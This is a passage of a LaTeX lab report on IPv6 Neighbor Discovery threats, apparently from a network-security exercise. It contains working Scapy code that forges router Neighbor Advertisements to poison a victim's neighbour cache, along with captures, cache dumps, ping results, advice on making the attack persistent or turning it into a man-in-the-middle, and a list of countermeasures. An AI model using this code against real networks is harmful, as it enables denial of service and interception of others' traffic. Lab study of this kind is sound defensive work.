...
\subsection{NDP threats: NA router cache poisoning}

For this exercise we targeted the neighbour-cache entry of the default
router on arpwatch-clients, with the goal of associating the link-local
address of the internal firewall with Kali's MAC address:

\begin{itemize}
    \item Attacker: \texttt{kali} (clients network)
    \item Victim: \texttt{arpwatch-clients}
    \item Impersonated host: internal firewall, link-local
        \texttt{fe80::64a3:2eff:fe83:1e7f}
\end{itemize}

Before the attack the victim holds the correct mapping for the router in
its neighbour cache, with the \texttt{router} flag set:

\newpage
\begin{lstlisting}
$ ip neigh show
fe80::64a3:2eff:fe83:1e7f dev eth0
   lladdr 66:a3:2e:83:1e:7f router STALE
\end{lstlisting}

where \texttt{66:a3:2e:83:1e:7f} is the genuine MAC of the internal
firewall on the clients segment. From Kali we then crafted a forged
Neighbor Advertisement with Scapy, setting \texttt{R=1} to mark the message
as coming from a router:

\begin{lstlisting}
d = IPv6(
   src="fe80::64a3:2eff:fe83:1e7f",
   dst="2001:470:b5b8:1e82:b89d:d3ff:feec:ea07")
e = ICMPv6ND_NA(R=1,
   tgt="fe80::64a3:2eff:fe83:1e7f")
f = ICMPv6NDOptDstLLAddr(
   lladdr="e6:80:50:76:15:46")
send(d/e/f, iface="eth0")
\end{lstlisting}

The capture \texttt{na-poisoning.pcap} confirms the forged NA, with the
\texttt{router, override} flags and Kali's MAC in the
destination link-address option:

\begin{lstlisting}
$ tcpdump -r na-poisoning.pcap -nn -vv icmp6
fe80::64a3:2eff:fe83:1e7f >
   2001:470:b5b8:1e82:b89d:d3ff:feec:ea07:
   ICMP6, neighbor advertisement,
   tgt is fe80::64a3:2eff:fe83:1e7f,
   Flags [router, override]
   destination link-address option (2):
      e6:80:50:76:15:46
\end{lstlisting}

Immediately after the injection, arpwatch-clients accepts the override and
its cache entry for the router points to Kali's MAC, while still keeping
the \texttt{router} flag:

\begin{lstlisting}
$ ip neigh show
fe80::64a3:2eff:fe83:1e7f dev eth0
   lladdr e6:80:50:76:15:46 router STALE
\end{lstlisting}

The practical effect is visible right away: pinging the router from the
victim fails completely, because the frames are delivered at layer~2 to
Kali (which silently drops them):

\begin{lstlisting}
$ ping6 -c 3 fe80::64a3:2eff:fe83:1e7f%eth0
3 packets transmitted, 0 received,
   100% packet loss, time 2042ms
\end{lstlisting}

The effect is not permanent: as soon as the kernel revalidates the
\texttt{STALE} entry through Neighbor Unreachability Detection, the
legitimate mapping is restored and the ping succeeds again with normal
RTT:

\begin{lstlisting}
$ ping6 -c 3 fe80::64a3:2eff:fe83:1e7f%eth0
3 packets transmitted, 3 received,
   0% packet loss, time 2012ms
rtt min/avg/max/mdev =
   0.611/1.008/1.758/0.530 ms
\end{lstlisting}

To make the attack persistent it is enough to keep injecting forged
advertisements, for example with
\texttt{send(pkt, inter=1, loop=1)} in Scapy. Because the poisoned entry
is the default gateway, every off-link packet of the victim is hijacked:
dropping the traffic yields a denial of service against the whole external
connectivity of the host, while forwarding it (after enabling
\texttt{net.ipv6.conf.all.forwarding=1} on Kali and poisoning the opposite
direction too) turns the attack into a full Man-in-the-Middle on the
victim's outbound traffic.

The standard countermeasures for these threats are the first-hop security
features available on managed switches (RA Guard, ND inspection, IPv6
source and prefix guard, DHCPv6 guard), together with monitoring tools like
NDPmon or the very arpwatch-style detector running in our network.
